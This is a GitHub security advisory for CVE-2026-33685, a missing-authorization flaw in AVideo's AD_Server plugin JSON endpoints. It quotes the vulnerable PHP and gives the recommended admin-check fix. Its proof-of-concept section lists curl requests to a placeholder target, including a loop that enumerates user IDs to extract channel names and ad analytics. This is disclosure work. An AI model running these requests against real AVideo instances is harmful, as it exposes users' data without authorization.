# [M] AVideo Allows Unauthenticated Access to AD_Server reports.json.php that Exposes Ad Campaign Analytics and User Data

## Summary
Severity: Medium
Advisory: GHSA-j36m-74g2-7m95
CVE: CVE-2026-33685
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-j36m-74g2-7m95
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `plugin/AD_Server/reports.json.php` endpoint performs no authentication or authorization checks, allowing any unauthenticated attacker to extract ad campaign analytics data including video titles, user channel names, user IDs, ad campaign names, and impression/click counts. The HTML counterpart (`reports.php`) and CSV export (`getCSV.php`) both correctly enforce `User::isAdmin()`, but the JSON API was left unprotected.

## Details

The vulnerable file `plugin/AD_Server/reports.json.php` loads the application configuration at line 5 but never checks whether the request comes from an authenticated admin user:

```php
// plugin/AD_Server/reports.json.php:1-10
<?php
header('Content-Type: application/json');
require_once '../../videos/configuration.php';

// Fetch request parameters with safety checks
$startDate = !empty($_REQUEST['startDate']) ? $_REQUEST['startDate'] . ' 00:00:00' : null;
$endDate = !empty($_REQUEST['endDate']) ? $_REQUEST['endDate'] . ' 23:59:59' : null;
$reportType = isset($_REQUEST['reportType']) ? $_REQUEST['reportType'] : null;
```

Compare with the HTML page at `plugin/AD_Server/reports.php:6-8`, which correctly gates access:

```php
if (!User::isAdmin()) {
    forbiddenPage(__("You cannot do this"));
    exit;
}
```

And `plugin/AD_Server/getCSV.php:4-6`:

```php
if (!User::isAdmin()) {
    forbiddenPage('You must be Admin');
}
```

The JSON endpoint exposes five report types, each querying joined tables that include user and video metadata. For example, `getAdsByVideoAndPeriod()` at `VastCampaignsLogs.php:239` executes:

```sql
SELECT v.title as video_title, u.channelName, v.users_id, vcl.videos_id,
       COUNT(vcl.id) as total_ads, vc.name as campaign_name
FROM vast_campaigns_logs vcl
LEFT JOIN videos v ON v.id = vcl.videos_id
LEFT JOIN users u ON u.id = v.users_id
LEFT JOIN vast_campaigns_has_videos vchv ON vchv.id = vcl.vast_campaigns_has_videos_id
LEFT JOIN vast_campaigns vc ON vc.id = vchv.vast_campaigns_id
```

This returns video titles, user channel names, user IDs, and campaign names directly to the unauthenticated caller.

Additionally, `plugin/AD_Server/getData.json.php` also lacks authentication and exposes aggregate ad view counts via `VastCampaignsLogs::getViews()`, though with lower impact.

## PoC

```bash
# 1. Get all ad performance by video — returns video titles, user channel names,
#    user IDs, campaign names, and impression counts (no auth needed)
curl -s 'https://target/plugin/AD_Server/reports.json.php?reportType=adsByVideo'

# Expected: JSON array with objects containing video_title, channelName,
# users_id, videos_id, total_ads, campaign_name

# 2. Get per-user ad analytics for a specific user
curl -s 'https://target/plugin/AD_Server/reports.json.php?reportType=adsByUser&users_id=1'

# Expected: JSON array with video_title, videos_id, total_ads, campaign_name, users_id

# 3. Get ad type breakdown with campaign names
curl -s 'https://target/plugin/AD_Server/reports.json.php?reportType=adTypes'

# Expected: JSON array with type, total_ads, campaign_name

# 4. Get ads for a specific video
curl -s 'https://target/plugin/AD_Server/reports.json.php?reportType=adsForSingleVideo&videos_id=1'

# Expected: JSON array with type, total_ads, campaign_name

# 5. Enumerate users by iterating user IDs
for i in $(seq 1 20); do
  curl -s "https://target/plugin/AD_Server/reports.json.php?reportType=adsByUser&users_id=$i"
done

# 6. Aggregate view counts (lower impact, also unauthenticated)
curl -s 'https://target/plugin/AD_Server/getData.json.php'

# Expected: {"error":false,"msg":"","views":12345}
```

## Impact

An unauthenticated attacker can:

- **Enumerate platform users**: Extract user IDs and channel names by iterating `users_id` values via the `adsByUser` report type
- **Extract ad campaign intelligence**: Obtain campaign names, types (own vs third-party), and performance metrics (impression and click counts per video/user)
- **Map video-to-user relationships**: Determine which user owns which video and their ad revenue performance
- **Competitive intelligence**: On multi-tenant instances, one content creator could extract another's ad performance data

The data exposed is business-sensitive analytics that the application explicitly restricts to administrators in both the HTML interface and CSV export, but the JSON API bypass makes all of it publicly accessible.

## Recommended Fix

Add `User::isAdmin()` checks to both `reports.json.php` and `getData.json.php`, matching the pattern used by `reports.php` and `getCSV.php`:

**plugin/AD_Server/reports.json.php** — add after line 5:
```php
<?php
header('Content-Type: application/json');
require_once '../../videos/configuration.php';

if (!User::isAdmin()) {
    header('HTTP/1.1 403 Forbidden');
    die(json_encode(['error' => 'You must be an admin to access this resource']));
}
```

**plugin/AD_Server/getData.json.php** — add after line 4:
```php
header('Content-Type: application/json');
require_once '../../videos/configuration.php';

if (!User::isAdmin()) {
    header('HTTP/1.1 403 Forbidden');
    die(json_encode(['error' => true, 'msg' => 'You must be an admin to access this resource']));
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-j36m-74g2-7m95
- https://nvd.nist.gov/vuln/detail/CVE-2026-33685
- https://github.com/WWBN/AVideo/commit/daca4ffb1ce19643eecaa044362c41ac2ce45dde
- https://github.com/WWBN/AVideo
